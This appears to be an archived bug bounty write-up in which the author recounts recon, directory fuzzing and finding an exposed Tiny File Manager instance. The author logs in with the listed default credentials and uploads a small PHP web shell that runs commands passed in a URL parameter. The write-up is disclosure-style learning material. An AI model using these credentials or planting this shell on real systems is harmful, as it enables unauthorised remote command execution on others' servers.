# Story Of My First RCE

- **Source URL:** https://medium.com/@0utlawh4ck3r/story-of-my-first-rce-9d74373fbc11?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142203/https://medium.com/@0utlawh4ck3r/story-of-my-first-rce-9d74373fbc11
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3247 (id 3247)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Story Of My First RCE :)

Hello Guys , I hope you are well 🍻

My name is Hossein And This Is my First Writeup .

Lets Call Program : target.com

When I was looking for a good program , find This Wide Program :))

The program said that all my assets were in scope, so I started to

## Wide recon :

My Recon Flow :

```
1 - Use Google Dork To Find Organization name 
2 - Use Whois Providers To Find Domain with Organization Name 
3 - Use bgp.he.net & bgpview.io To Discover ASNs
4 - Use Certificate Search 
```
After I did all this, I found almost 30,000 domains, 99% of which belonged to that company. So Started Hunting

## Hunt :

Used HTTPx & Dnsx For Resolving domains .

Httpx command :

`httpx -title -sc -cl -asn -td -o httpx.out`
After Httpx command , filter Result to Just Show Me Domains Used PHP :))

Because I Love Hunt On Legacy WebApps.

Now I Have 300 Domain Used PHP Tech , randomly opened a domain and main page like this :

Start Fuzzing On Target With [Dirsearch](https://github.com/maurosoria/dirsearch) :

- This Is Not Full Result , Because I took this photo after reporting and many of those files were deleted

There is a page named admin , when i open this redirect me to main page .

Again I used dirsearch tool to find some interesting directory 🙃

I Found directory named : tinyfilemanager.php :

I had never seen this before and I started searching about this CMS .

I Found This [Article](https://exploit-notes.hdks.org/exploit/web/tiny-file-manager-pentesting/) About Exploit Some Web CMS and etc.

It was written in this article that you can login with this user and password by default :

```
admin:admin@123
  OR
user:12345
```
When I used these user passwords, I logged in very strangely 😅 I couldn’t believe that I was finally able to take the first RCE.

I was able to upload my shell using this PHP code :

```
<?php
  $cmd = $_GET["cmd"];
  echo system($cmd);
?>
```
Boom My Command Run💥

Thank you very much for taking the time to read this writeup

This is my Twitter account, thank you for following me and if you have any questions, be sure to ask 🌹🍻 (I apologize for my bad English)

[Twitter](https://twitter.com/outlawh4ck3r)
